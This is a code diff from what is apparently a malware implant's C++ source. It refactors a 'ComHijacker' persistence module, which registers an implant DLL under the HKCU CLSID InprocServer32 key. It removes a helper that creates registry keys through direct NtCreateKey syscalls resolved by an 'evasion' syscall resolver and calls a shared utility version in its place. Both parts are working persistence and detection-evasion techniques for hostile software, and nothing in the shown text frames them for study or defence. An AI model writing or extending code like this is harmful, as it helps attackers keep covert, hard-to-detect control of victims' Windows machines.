@@ -9,48 +9,6 @@
 
 namespace persistence {
 
-namespace {
-    NTSTATUS NtCreateKeyRelative(HANDLE hRoot, const std::wstring& relativePath, PHANDLE hTarget) {
-        auto& resolver = evasion::SyscallResolver::GetInstance();
-        DWORD ntCreateKeySsn = resolver.GetServiceNumber("NtCreateKey");
-        DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
-
-        if (ntCreateKeySsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF) return (NTSTATUS)0xC0000001;
-
-        std::wstringstream ss(relativePath);
-        std::wstring segment;
-        HANDLE hParent = hRoot;
-        HANDLE hNew = NULL;
-        NTSTATUS status = 0;
-
-        while (std::getline(ss, segment, L'\\')) {
-            if (segment.empty()) continue;
-
-            UNICODE_STRING uSegment;
-            uSegment.Buffer = (PWSTR)segment.c_str();
-            uSegment.Length = (USHORT)(segment.length() * sizeof(wchar_t));
-            uSegment.MaximumLength = uSegment.Length + sizeof(wchar_t);
-
-            OBJECT_ATTRIBUTES objAttr;
-            InitializeObjectAttributes(&objAttr, &uSegment, OBJ_CASE_INSENSITIVE, hParent, NULL);
-
-            ULONG disp = 0;
-            status = InternalDoSyscall(ntCreateKeySsn, &hNew, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, 0, NULL, 0, &disp, NULL, NULL, NULL, NULL);
-
-            // Close intermediate handle, but not the initial hRoot
-            if (hParent != hRoot && hParent != NULL) {
-                InternalDoSyscall(ntCloseSsn, hParent, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
-            }
-
-            if (!NT_SUCCESS(status)) return status;
-            hParent = hNew;
-        }
-
-        *hTarget = hParent;
-        return status;
-    }
-}
-
 bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& clsid) {
     LOG_DEBUG("ComHijacker::Install started");
 
@@ -91,7 +49,7 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
 
     std::wstring relativePath = L"Software\\Classes\\CLSID\\" + clsid + L"\\InprocServer32";
     HANDLE hKey = NULL;
-    status = NtCreateKeyRelative(hHkcu, relativePath, &hKey);
+    status = utils::Shared::NtCreateKeyRelative(hHkcu, relativePath, &hKey);
 
     // Close HKCU root handle
     InternalDoSyscall(ntCloseSsn, hHkcu, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
